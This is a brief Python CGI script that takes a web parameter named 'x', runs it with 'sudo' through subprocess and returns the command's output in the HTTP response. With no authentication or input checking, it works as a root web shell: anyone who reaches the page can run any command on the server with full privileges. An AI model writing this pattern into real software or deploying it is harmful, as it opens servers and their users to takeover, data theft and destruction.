#!/usr/bin/python3

print("content-type: text/html")
print()

import cgi
import subprocess as sp

f = cgi.FieldStorage()
i = f.getvalue("x")
#print(i)
k = sp.getoutput("sudo "+i)
print(k)
